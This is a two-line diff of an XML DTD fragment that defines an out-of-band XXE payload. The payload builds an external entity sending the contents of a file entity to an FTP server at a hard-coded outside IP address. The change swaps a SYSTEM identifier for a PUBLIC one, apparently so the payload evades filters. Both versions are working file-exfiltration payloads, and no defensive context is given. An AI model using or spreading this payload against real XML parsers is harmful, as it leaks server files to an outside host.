@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://40.65.112.65:21/%file;'>">
+<!ENTITY % all "<!ENTITY send PUBLIC '-//W3C//DTD HTML 4.0 Transitional//EN' 'ftp://40.65.112.65:21/%file;'>">
 %all;
